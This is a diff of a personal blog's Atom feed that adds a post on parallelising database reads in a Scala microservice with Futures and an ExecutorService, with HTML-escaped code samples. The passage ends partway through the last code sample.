@@ -2,13 +2,219 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
   <id>https://vy.github.io//</id>
   <title>Volkan Yazıcı's Soap Co.</title>
-  <updated>2015-08-15T15:25:00Z</updated>
+  <updated>2015-08-20T16:20:00Z</updated>
   <link rel="alternate" href="https://vy.github.io//"/>
   <link rel="self" href="https://vy.github.io//blog/feed/"/>
   <author>
     <name>Volkan Yazıcı</name>
     <uri>https://vy.github.io/</uri>
   </author>
+  <entry>
+    <id>tag:vy.github.io,2015-08-20://blog/post/2015/08/20/scala-futures/</id>
+    <title type="html">Improving Performace Using Scala Futures</title>
+    <published>2015-08-20T16:20:00Z</published>
+    <updated>2015-08-20T16:20:00Z</updated>
+    <link rel="alternate" href="https://vy.github.io//blog/post/2015/08/20/scala-futures/"/>
+    <content type="html">
+&lt;p&gt;At &lt;a href="http://bol.com/"&gt;bol.com&lt;/a&gt;, we have a microservice-based software
+ecosystem. Every functionally grown enough monolithic software is split into
+its own microservice, which exposes a simple REST interface to the outside
+world. Fine-grained functional scope of the services helps to keep the code
+base clean and lets programmers just to stick to the point. Which implicitly
+also results in a coding style such that the &lt;em&gt;clean code&lt;/em&gt; has a higher
+priority over performance. Optimizations are introduced whenever they are
+necessary and after careful profiling. For the rest, &lt;a href="https://en.wikipedia.org/wiki/KISS_principle"&gt;KISS
+principle&lt;/a&gt; is applied.&lt;/p&gt;
+
+&lt;h1 id="the-problem"&gt;The Problem&lt;/h1&gt;
+
+&lt;p&gt;For a particular microservice, we are given the task of returning a snapshot
+of the current state of the data model. In this post, I will use the following
+simple model to demonstrate the problem at hand and the solution I came up
+with.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src="arch.png" alt="Sample service-layered architecture"&gt;&lt;/p&gt;
+
+&lt;p&gt;In a nutshell, service basically encapsulates &lt;code&gt;User&lt;/code&gt; and &lt;code&gt;Group&lt;/code&gt; entities in
+the database. While doing so, database records are first interfaced via a
+&lt;a href="https://en.wikipedia.org/wiki/Data_access_object"&gt;DAO&lt;/a&gt; layer requiring a
+database connection to operate.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class="language-scala"&gt;&lt;span class="k"&gt;trait&lt;/span&gt; &lt;span class="nc"&gt;UserDao&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+
+  &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;create&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;groupId&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Int&lt;/span&gt;&lt;span class="o"&gt;)(&lt;/span&gt;&lt;span class="k"&gt;implicit&lt;/span&gt; &lt;span class="n"&gt;connection&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Unit&lt;/span&gt;
+
+  &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;findAll&lt;/span&gt;&lt;span class="o"&gt;()(&lt;/span&gt;&lt;span class="k"&gt;implicit&lt;/span&gt; &lt;span class="n"&gt;connection&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Seq&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="kt"&gt;User&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
+
+&lt;span class="o"&gt;}&lt;/span&gt;
+
+&lt;span class="k"&gt;trait&lt;/span&gt; &lt;span class="nc"&gt;GroupDao&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+
+  &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;create&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+
+  &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;findAll&lt;/span&gt;&lt;span class="o"&gt;()(&lt;/span&gt;&lt;span class="k"&gt;implicit&lt;/span&gt; &lt;span class="n"&gt;connection&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Seq&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="kt"&gt;Group&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
+
+  &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;findById&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Int&lt;/span&gt;&lt;span class="o"&gt;)(&lt;/span&gt;&lt;span class="k"&gt;implicit&lt;/span&gt; &lt;span class="n"&gt;connection&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Option&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="kt"&gt;Group&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
+
+&lt;span class="o"&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Next, DAO layers are interfaced by services
+such that they acquire a database connection from the JDBC pool and make
+relevant DAO calls.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class="language-scala"&gt;&lt;span class="k"&gt;trait&lt;/span&gt; &lt;span class="nc"&gt;UserService&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+
+  &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;create&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;groupId&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Int&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Unit&lt;/span&gt;
+
+  &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;findAll&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Seq&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="kt"&gt;User&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
+
+&lt;span class="o"&gt;}&lt;/span&gt;
+
+&lt;span class="nd"&gt;@Component&lt;/span&gt;
+&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;UserServiceImpl&lt;/span&gt; &lt;span class="nd"&gt;@Autowired&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt;
+&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;userDao&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;UserDao&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
+ &lt;span class="n"&gt;groupDao&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;GroupDao&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
+ &lt;span class="n"&gt;connectionPool&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;ConnectionPool&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+ &lt;span class="k"&gt;extends&lt;/span&gt; &lt;span class="nc"&gt;UserService&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+
+  &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;create&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;groupId&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Int&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Unit&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;
+    &lt;span class="n"&gt;connectionPool&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;acquire&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="k"&gt;implicit&lt;/span&gt; &lt;span class="n"&gt;connection&lt;/span&gt; &lt;span class="k"&gt;=&amp;gt;&lt;/span&gt;
+      &lt;span class="n"&gt;require&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;groupDao&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;findById&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;groupId&lt;/span&gt;&lt;span class="o"&gt;).&lt;/span&gt;&lt;span class="n"&gt;isDefined&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="s"&gt;"non-existing group id"&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+      &lt;span class="n"&gt;userDao&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;create&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;groupId&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+    &lt;span class="o"&gt;}&lt;/span&gt;
+
+  &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;findAll&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Seq&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="kt"&gt;User&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="k"&gt;=&lt;/span&gt;
+    &lt;span class="n"&gt;connectionPool&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;acquire&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="k"&gt;implicit&lt;/span&gt; &lt;span class="n"&gt;connection&lt;/span&gt; &lt;span class="k"&gt;=&amp;gt;&lt;/span&gt;
+      &lt;span class="n"&gt;userDao&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;findAll&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt;
+    &lt;span class="o"&gt;}&lt;/span&gt;
+
+&lt;span class="o"&gt;}&lt;/span&gt;
+
+&lt;span class="c1"&gt;// GroupService and GroupServiceImpl are implemented likewise...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This also applies to &lt;code&gt;SnapshotService&lt;/code&gt;, which accesses &lt;code&gt;UserDao&lt;/code&gt; and
+&lt;code&gt;GroupDao&lt;/code&gt; using a single database connection.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class="language-scala"&gt;&lt;span class="k"&gt;trait&lt;/span&gt; &lt;span class="nc"&gt;SnapshotService&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+
+  &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;take&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Snapshot&lt;/span&gt;
+
+&lt;span class="o"&gt;}&lt;/span&gt;
+
+&lt;span class="nd"&gt;@Component&lt;/span&gt;
+&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;SnapshotServiceImpl&lt;/span&gt; &lt;span class="nd"&gt;@Autowired&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt;
+&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;userDao&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;UserDao&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
+ &lt;span class="n"&gt;groupDao&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;GroupDao&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
+ &lt;span class="n"&gt;connectionPool&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;ConnectionPool&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+
+  &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;take&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Snapshot&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;
+    &lt;span class="n"&gt;connectionPool&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;acquire&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="k"&gt;implicit&lt;/span&gt; &lt;span class="n"&gt;connection&lt;/span&gt; &lt;span class="k"&gt;=&amp;gt;&lt;/span&gt;
+      &lt;span class="nc"&gt;Snapshot&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;from&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;
+      	&lt;span class="n"&gt;users&lt;/span&gt; &lt;span class="k"&gt;=&lt;/span&gt; &lt;span class="n"&gt;userDao&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;findAll&lt;/span&gt;&lt;span class="o"&gt;(),&lt;/span&gt;
+      	&lt;span class="n"&gt;groups&lt;/span&gt; &lt;span class="k"&gt;=&lt;/span&gt; &lt;span class="n"&gt;groupDao&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;findAll&lt;/span&gt;&lt;span class="o"&gt;())&lt;/span&gt;
+    &lt;span class="o"&gt;}&lt;/span&gt;
+
+&lt;span class="o"&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;While this approach totally makes sense, as the user and group collections
+start to grow in size, calls to &lt;code&gt;SnapshotService.take()&lt;/code&gt; started to take more
+and more time.&lt;/p&gt;
+
+&lt;h1 id="the-solution"&gt;The Solution&lt;/h1&gt;
+
+&lt;p&gt;Given the fact that constructing a snapshot is a read-only operation, I
+anticipated querying &lt;code&gt;UserDao.findAll()&lt;/code&gt; and &lt;code&gt;GroupDao.findAll()&lt;/code&gt; in parallel
+will buy us quite some &lt;code&gt;SnapshotService.take()&lt;/code&gt; time. That being said, it is
+crucial to note that querying DAOs via separate database connections in
+parallel  is going to violate the transactional safety, but in our case it has
+a negligible margin of error for fetching collections in parallel.&lt;/p&gt;
+
+&lt;p&gt;I updated the existing &lt;code&gt;SnapshotService&lt;/code&gt; to replace its &lt;code&gt;UserDao&lt;/code&gt; and
+&lt;code&gt;GroupDao&lt;/code&gt; calls to &lt;code&gt;UserService&lt;/code&gt; and &lt;code&gt;GroupService&lt;/code&gt; instead (to provide each
+DAO a dedicated connection) and perform these fetch operations in parallel
+through an &lt;code&gt;ExecutorService&lt;/code&gt; as follows:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src="parallel-arch.png" alt="Sample service-layered architecture with parallelization"&gt;&lt;/p&gt;
+
+&lt;p&gt;I implemented &lt;code&gt;ExecutorService&lt;/code&gt; using Scala’s &lt;code&gt;Future&lt;/code&gt;s:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class="language-scala"&gt;&lt;span class="k"&gt;trait&lt;/span&gt; &lt;span class="nc"&gt;ExecutorService&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+
+  &lt;span class="k"&gt;implicit&lt;/span&gt; &lt;span class="k"&gt;val&lt;/span&gt; &lt;span class="n"&gt;executionContext&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;ExecutionContext&lt;/span&gt;
+
+  &lt;span class="k"&gt;val&lt;/span&gt; &lt;span class="n"&gt;awaitDuration&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Duration&lt;/span&gt;
+
+  &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;await&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="kt"&gt;T&lt;/span&gt;&lt;span class="o"&gt;](&lt;/span&gt;&lt;span class="n"&gt;future&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Future&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="kt"&gt;T&lt;/span&gt;&lt;span class="o"&gt;])&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;T&lt;/span&gt;
+
+  &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;awaitAll&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;futures&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Future&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="k"&gt;_&lt;/span&gt;&lt;span class="o"&gt;]*)&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Unit&lt;/span&gt;
+
+  &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;schedule&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="kt"&gt;T&lt;/span&gt;&lt;span class="o"&gt;](&lt;/span&gt;&lt;span class="n"&gt;body&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;T&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Future&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="kt"&gt;T&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
+
+  &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;scheduleAll&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;bodies&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="o"&gt;(()&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;_&lt;/span&gt;&lt;span class="o"&gt;)*)&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Future&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="kt"&gt;Unit&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
+
+&lt;span class="o"&gt;}&lt;/span&gt;
+
+&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;ExecutorServiceImpl&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;awaitDurationSpec&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="k"&gt;extends&lt;/span&gt; &lt;span class="nc"&gt;ExecutorService&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+
+  &lt;span class="n"&gt;requireNotNull&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"await duration specification"&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;awaitDurationSpec&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+
+  &lt;span class="k"&gt;override&lt;/span&gt; &lt;span class="k"&gt;implicit&lt;/span&gt; &lt;span class="k"&gt;val&lt;/span&gt; &lt;span class="n"&gt;executionContext&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;ExecutionContext&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nc"&gt;ExecutionContext&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;Implicits&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;global&lt;/span&gt;
+
+  &lt;span class="k"&gt;override&lt;/span&gt; &lt;span class="k"&gt;val&lt;/span&gt; &lt;span class="n"&gt;awaitDuration&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Duration&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nc"&gt;Duration&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;awaitDurationSpec&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+
+  &lt;span class="k"&gt;override&lt;/span&gt; &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;await&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="kt"&gt;T&lt;/span&gt;&lt;span class="o"&gt;](&lt;/span&gt;&lt;span class="n"&gt;future&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Future&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="kt"&gt;T&lt;/span&gt;&lt;span class="o"&gt;])&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;T&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nc"&gt;Await&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;future&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;awaitDuration&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+
+  &lt;span class="k"&gt;override&lt;/span&gt; &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;awaitAll&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;futures&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Future&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="k"&gt;_&lt;/span&gt;&lt;span class="o"&gt;]*)&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Unit&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;futures&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;nonEmpty&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+      &lt;span class="n"&gt;await&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="n"&gt;futures&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;reduce&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;prev&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;next&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="k"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;prev&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;flatMap&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;_&lt;/span&gt; &lt;span class="k"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;next&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
+
+  &lt;span class="k"&gt;override&lt;/span&gt; &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;schedule&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="kt"&gt;T&lt;/span&gt;&lt;span class="o"&gt;](&lt;/span&gt;&lt;span class="n"&gt;body&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;T&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Future&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="kt"&gt;T&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="k"&gt;=&lt;/span&gt; &lt;span class="nc"&gt;Future&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="n"&gt;body&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
+
+  &lt;span class="k"&gt;override&lt;/span&gt; &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;scheduleAll&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;bodies&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="o"&gt;(()&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;_&lt;/span&gt;&lt;span class="o"&gt;)*)&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Future&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="kt"&gt;Unit&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="k"&gt;=&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;bodies&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;isEmpty&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nc"&gt;Future&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;successful&lt;/span&gt;&lt;span class="o"&gt;(())&lt;/span&gt;
+    &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="n"&gt;schedule&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="n"&gt;bodies&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;map&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;body&lt;/span&gt; &lt;span class="k"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;schedule&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="n"&gt;body&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;}).&lt;/span&gt;&lt;span class="n"&gt;foreach&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;await&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
+
+&lt;span class="o"&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;And then employing &lt;code&gt;ExecutorService&lt;/code&gt; in &lt;code&gt;SnapshotService&lt;/code&gt; is a piece of cake:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class="language-scala"&gt;&lt;span class="nd"&gt;@Component&lt;/span&gt;
+&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;SnapshotServiceImpl&lt;/span&gt; &lt;span class="nd"&gt;@Autowired&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt;
+&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;userService&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;UserService&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
